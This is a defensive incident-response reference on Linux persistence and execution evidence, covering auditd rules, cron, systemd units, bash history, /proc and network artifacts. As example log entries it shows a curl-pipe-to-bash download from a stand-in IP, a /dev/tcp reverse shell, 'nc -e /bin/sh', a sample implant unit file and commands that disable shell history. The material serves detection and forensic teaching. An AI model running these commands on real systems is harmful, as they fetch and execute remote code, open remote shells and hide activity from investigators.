# Linux Log Reference: Persistence & Execution Evidence

Linux endpoints show up in most SOCs as an afterthought — the fleet is mostly Windows, EDR coverage on Linux is thinner, and analysts who came up doing Windows DFIR often treat `/var/log` and `auditd` like a foreign language. Then a customer-facing web tier gets popped, the incident call has six people on it, and the Linux boxes are the ones with the actual evidence. This section is the field reference for that moment: where persistence and execution evidence actually lives on a Linux host, what's reliable, and what a defense attorney (or a skeptical exec) will correctly point out is weak.

The short version, up front: **auditd is your primary source of truth for execution. Everything else is corroboration.** Bash history is the thing junior analysts reach for first and the thing that falls apart first under scrutiny.

## auditd: the backbone of Linux execution evidence

`auditd` is the Linux Audit Framework's userspace daemon. RHEL-family distros install and enable it by default (a legacy of the STIG/CAPP heritage); Debian/Ubuntu-family distros ship the package in their repos but don't install it by default, so don't assume it's present just because the host is Linux. If it's not installed and configured with sane rules, you are investigating blind — `ps` and log files alone will not reconstruct what actually executed, with what arguments, as which user.

Two gaps worth flagging up front rather than discovering mid-incident. First, Alpine and other musl-based minimal images typically don't ship `auditd` at all — it's not in their default package set, and the minimal-footprint design that makes these images popular for containers works against carrying an audit daemon on the host. Second, the kernel audit subsystem is a single host-wide instance, so a container almost never runs its own `auditd` — container-originated execve activity, if it's captured at all, lands in the *host's* audit trail tagged with a PID namespace that has to be mapped back to the container before it means anything.

**[ENGINEERING]** - A minimal but useful execution-visibility rule set (added via `augenrules` or directly in `/etc/audit/rules.d/`):

```
# Watch all execve syscalls, both architectures
-a always,exit -F arch=b64 -S execve -k exec_watch
-a always,exit -F arch=b32 -S execve -k exec_watch

# Watch persistence-relevant paths
-w /etc/cron.d/ -p wa -k cron_persist
-w /etc/crontab -p wa -k cron_persist
-w /var/spool/cron/ -p wa -k cron_persist
-w /etc/systemd/system/ -p wa -k systemd_persist
-w /lib/systemd/system/ -p wa -k systemd_persist
-w /etc/rc.local -p wa -k rclocal_persist
-w /etc/ld.so.preload -p wa -k preload_persist
```

An `execve` event produces a small cluster of correlated audit records sharing one `msgid` timestamp — you'll normally see `SYSCALL`, `EXECVE`, `CWD`, and one or more `PATH` records. `ausearch -k exec_watch -ts recent` will pull them back; `aureport` gives you rolled-up summaries for triage.

| Field | Record type | Meaning |
|---|---|---|
| `exe` | SYSCALL | Full path to the binary that was actually executed |
| `comm` | SYSCALL | Process name as reported by the kernel (can be spoofed by the process itself, `exe` cannot) |
| `pid` / `ppid` | SYSCALL | Process and parent process ID — build your process tree from this |
| `uid` / `auid` | SYSCALL | Effective UID and *login* UID — `auid` survives `sudo`/`su`, which is what makes it useful for attribution |
| `a0`, `a1`, `a2`... | EXECVE | Positional argv — the literal command-line arguments |
| `success` | SYSCALL | Whether the syscall succeeded — failed execve attempts still matter (tool not found, permission denied, testing payload paths) |
| `key` | SYSCALL/PATH | The `-k` label from the rule that fired — lets you filter fast |

**[ANALYST]** - Two things trip people up constantly:

- `auid=4294967295` (i.e. `-1` unsigned) means "no login session" — this is normal for processes spawned by init, cron, or systemd directly, not inherently suspicious.
- EXECVE argument records get truncated/split across `a0..aN` and sometimes hex-encoded if they contain non-printable or unusual characters. `ausearch -i` (interpret) will decode UID/GID names and unescape most of this, but always sanity-check against the raw record if something looks off — obfuscated payloads sometimes rely on the analyst not looking past the interpreted view.

## Cron-based persistence

Cron is still the single most common Linux persistence mechanism in incidents I've worked, precisely because it's boring and nobody's watching it.

| Location | Scope | Notes |
|---|---|---|
| `/etc/crontab` | System-wide | Includes a user field (unlike per-user crontabs) |
| `/etc/cron.d/*` | System-wide | Package-managed and attacker-favorite — one file per job, easy to drop and easy to miss among legitimate entries |
| `/etc/cron.{hourly,daily,weekly,monthly}/` | System-wide | Scripts, not crontab lines — attackers drop an executable script here directly |
| `/var/spool/cron/crontabs/<user>` (Debian/Ubuntu) or `/var/spool/cron/<user>` (RHEL/CentOS) | Per-user | Edited via `crontab -e`; check timestamps against the user's known activity |
| systemd timer units (`*.timer` + paired `*.service`) | System-wide | The "modern cron" — covered under systemd below, but functionally the same persistence goal |

**[ANALYST]** - Execution evidence: on most distros cron logs to syslog/journal with a `CRON` program tag —

```
Sep 14 03:00:01 web01 CRON[28451]: (root) CMD (curl -s http://198.51.100.44/upd.sh | bash)
```

RHEL-family systems may route this to `/var/log/cron` instead of the main journal — don't assume it's missing just because it's not in `journalctl` output, check the dedicated file. On Debian/Ubuntu it's in the syslog/journal under the `CRON` unit.

Cross-reference that CRON log line against the `cron_persist` auditd file-watch hits (who wrote the `/etc/cron.d/` entry, when, from which parent process) and against the `exec_watch` cluster for the actual `curl | bash` execve. A confirmed cron persistence finding usually has all three lines up: file write → recurring CRON log entry → execve record showing the payload each run. If you only have one of the three, say so explicitly in the case notes — don't round up to "confirmed."

**[STAKEHOLDER]** - Cron persistence is attractive to an attacker because it survives reboots, requires no exploit to maintain, and blends into thousands of legitimate scheduled jobs. The business risk isn't the mechanism itself — it's that it means the attacker intends to come back, which changes the response from "clean and patch" to "assume return access exists until proven otherwise."

## systemd service persistence

systemd unit files are the other major persistence surface, and increasingly the preferred one, because a convincingly-named unit blends in with dozens of legitimate ones and `systemctl status` output rarely gets read line by line. This section assumes systemd, which covers the large majority of current-generation server distros (RHEL/CentOS/Rocky/Alma since 7, Ubuntu since 15.04, Debian since 8, SUSE since 12) — but not all of them: Alpine (OpenRC) and some embedded/BusyBox-based images have no systemd at all, so on those hosts look at `/etc/init.d/`, `/etc/local.d/` (OpenRC), and cron instead.

| Location | Notes |
|---|---|
| `/etc/systemd/system/` | Local admin/attacker-created units — highest suspicion tier |
| `/usr/lib/systemd/system/` or `/lib/systemd/system/` | Package-installed units — attacker modification here is a strong compromise indicator |
| `/run/systemd/system/` | Runtime-only, does not survive reboot — but still executes now |
| `~/.config/systemd/user/` | Per-user units, don't need root, easy to miss in a root-focused sweep |
| `/etc/systemd/system/*.target.wants/` (symlinks) | Enablement evidence — a unit can exist without being enabled |

**[ENGINEERING]** - The unit's `ExecStart=` line is the payload. Attackers frequently name the file to resemble a legitimate systemd/network component — `systemd-network-helper.service`, `dbus-org.freedesktop.resolve1.service` — while the file itself lives outside the standard package paths. Compare `dpkg -V` / `rpm -V` output (or a known-good file manifest) against what's actually present; a unit file with a modification time that doesn't match its package's install date is a red flag on its own.

```ini
[Unit]
Description=System Network Diagnostics
After=network.target

[Service]
ExecStart=/usr/lib/systemd-net/diagd -c /etc/.cache/conf.dat
Restart=always
User=root

[Install]
WantedBy=multi-user.target
```

`Restart=always` is worth flagging on sight in any unit you don't recognize — it's a self-healing beacon/implant pattern, not something typical utility services need.

**[ANALYST]** - `journalctl -u <unit>` gives you the unit's own stdout/stderr and start/stop transitions. `journalctl _COMM=systemd` shows systemd's own actions — unit loads, enables, symlink creation — which is where you'll see the `Created symlink ... -> ...` line proving the enable action and when it happened. `systemctl list-unit-files --state=enabled` is your sweep command across a fleet. Correlate the file-write timestamp (from the `systemd_persist` auditd watch) with the `journalctl` enable event and the first `Started <unit>` log line — same three-point pattern as cron.

## Bash history: useful corroboration, not evidence you can rely on

This is the one every new analyst wants to lead with, and it's the one that will not hold up.

**[ANALYST]** - `~/.bash_history` is trivially defeated, often by accident rather than tradecraft:

- `unset HISTFILE` before running commands stops any history writing for that shell session — nothing gets logged, ever, retroactively unclearable because there was nothing to clear.
- `export HISTFILE=/dev/null` — same effect, common in service account `.bashrc` files for entirely legitimate reasons (automation scripts that don't want noisy history), which means its *absence* on a box is not itself suspicious.
- `history -c` clears the in-memory history for the current session; combined with `history -w` or just exiting without triggering a flush, nothing hits disk.
- History is normally only written to disk on clean shell exit (or via `PROMPT_COMMAND='history -a'` if someone configured it that way) — a reverse shell that gets killed, not exited cleanly, frequently never flushes at all. This is not attacker cleverness, it's just how bash buffers history by default.
- `HISTSIZE`/`HISTFILESIZE` set to 0 or low values silently truncate what's kept.
- Root and service-account shells commonly run with history disabled by default hardening baselines — so a compromised `svc-backup` account showing zero bash history is *expected*, not evidence of tampering.

Treat `.bash_history` the way you'd treat a suspect's own diary: useful if it's there and consistent with other evidence, meaningless to conclude anything from if it's missing or empty. The auditd `execve` trail is the record that doesn't depend on the attacker's shell hygiene. If your environment lacks auditd coverage, that's a genuine visibility gap worth escalating — not something bash history can substitute for.

**[MANAGEMENT]** - If auditd rules aren't deployed fleet-wide, or the audit log rotation/retention window is short, this should be tracked as a logging gap in the same register as missing EDR coverage — not treated as an acceptable baseline because "it's just Linux."

## Process information: `ps` and `/proc`

Live process state is fast to check and gone the moment the process exits — treat it as a snapshot, not a record.

**[ANALYST]** - `ps auxwf` gives you the current tree with full command lines. `/proc/<pid>/` is more useful for depth:

| `/proc/<pid>/` entry | What it tells you |
|---|---|
| `cmdline` | Null-separated argv — raw, not shell-reconstructed |
| `exe` | Symlink to the executed binary; shows `(deleted)` if the file was removed after exec starts — classic self-deleting dropper behavior |
| `environ` | Process environment — check for `LD_PRELOAD`/`LD_LIBRARY_PATH` injection, unusual `PATH` entries |
| `fd/` | Open file descriptors — sockets show as `socket:[inode]`, and you can match that inode against `/proc/net/tcp` |
| `cwd` | Working directory symlink — often `/tmp`, `/dev/shm`, or a hidden dotfile directory for dropped tooling |

An `exe` pointing to `/tmp/.X11-cache/agent (deleted)` next to a still-running `pid` is one of the more reliable single artifacts you'll find on a live Linux box — the binary is gone from disk but the running process still holds a reference to the inode, which you can often recover by reading `/proc/<pid>/exe` directly even after unlink.

The limitation is timing: once the process exits, its `/proc/<pid>` directory disappears immediately — there is no "recently exited process" cache. If you didn't capture it live and auditd wasn't logging the execve, that execution is gone for good.

## Network connection evidence: `ss`, `netstat`, `conntrack`

**[ANALYST]** -

| Tool | Notes |
|---|---|
| `ss -tunap` | Modern standard; shows TCP/UDP, listening + established, with PID/process name (needs root or matching UID for full output) |
| `netstat -tunap` | Older, may not be installed on minimal container/cloud images by default — don't assume it's present |
| `conntrack -L` | Kernel connection tracking table — shows NAT'd and forwarded connections, useful behind a NAT gateway/container host, entries expire on their own timeout so pull it fast |
| `/proc/net/tcp` / `/proc/net/tcp6` | Raw table, addresses in hex, inode column lets you tie back to a specific `fd` under `/proc/<pid>/fd/` |

A reverse shell shows up as an outbound `ESTABLISHED` connection where the local process is something that has no business making network calls on its own — `bash`, `sh`, `nc`, `python3` — to a remote port that's not a standard service (`4444`, `8443` used non-TLS, `1337`, high ephemeral ports on the *remote* side rather than local).

## Worked scenario: download-and-execute via curl

```
type=EXECVE argc=3 a0="bash" a1="-c" a2="curl -s http://198.51.100.44/upd.sh | bash"
type=EXECVE argc=3 a0="curl" a1="-s" a2="http://198.51.100.44/upd.sh"
```

The first record is the parent shell invocation (e.g. a cron job or webshell calling `system()`); the second is the child `curl` it forked. This is followed within the same second by a third execve cluster spawning whatever `upd.sh` contained, plus an `ss` snapshot (if caught live) showing `curl` with an `ESTABLISHED` connection to `198.51.100.44:80`. The pattern to look for across the fleet: `curl`/`wget` invoked with `-s`/`-q` (quiet flags — legitimate ops scripts use these too, but combined with a pipe to a shell it's a strong signal), destination IP with no matching DNS/proxy record for that host's normal function, and a `chmod +x` execve immediately preceding the payload's own execve if it was downloaded to disk rather than piped directly.

## Worked scenario: reverse shell

```
type=EXECVE argc=3 a0="bash" a1="-c" a2="bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
```

Parent process (`ppid`) tracing back to a web server worker (`www-data` spawning `bash` from an Nginx/PHP-FPM/Apache child) is the giveaway in a web-tier compromise — legitimate web workers do not fork interactive shells. Cross-check `ss -tunap` for the matching `ESTABLISHED` socket owned by that same `pid`, and check `/proc/<pid>/fd` for `fd 0/1/2` pointing at the same socket inode — that's the actual `/dev/tcp` redirection trick made visible. `nc -e /bin/sh <ip> <port>` and Python one-liners (`socket.socket(...)`) show the same shape: unusual parent, shell/interpreter process with an active outbound connection, non-standard destination port.

**[ANALYST]** - Not every unusual outbound connection is a confirmed reverse shell — SSH tunnels, legitimate monitoring agents phoning home on nonstandard ports, and misconfigured health checks produce similar surface patterns. Validate the full chain (parent process lineage + argv + destination reputation) before calling it. "Insufficient Evidence" or "Benign Positive" are legitimate closures here if the process tree is legitimate and the destination checks out as a known partner/monitoring service.

## Quick reference: evidence priority by claim

| Claim | Primary evidence | Corroboration | Weak/insufficient alone |
|---|---|---|---|
| Cron persistence | auditd `cron_persist` file-watch hit | CRON log line, execve of payload | Crontab file present with no execution log |
| systemd persistence | auditd `systemd_persist` file-watch hit + unit's `ExecStart` | `journalctl` enable/start events | `systemctl list-unit-files` showing "enabled" with no journal entries |
| Suspicious download | auditd execve of `curl`/`wget` with full argv | `ss`/`conntrack` matching outbound connection | Presence of the downloaded file on disk with no execution record |
| Reverse shell | auditd execve showing shell redirection syntax + abnormal parent process | `ss -tunap` matching ESTABLISHED socket | Bash history entry alone |

Build the case on auditd and process/network state, use bash history only when it happens to still be there, and always note in the write-up which of the three corroborating layers (file event, execution record, network record) you actually had — gaps in that chain are normal on Linux estates with partial audit coverage, and saying so plainly is more credible than implying a complete picture you don't have.
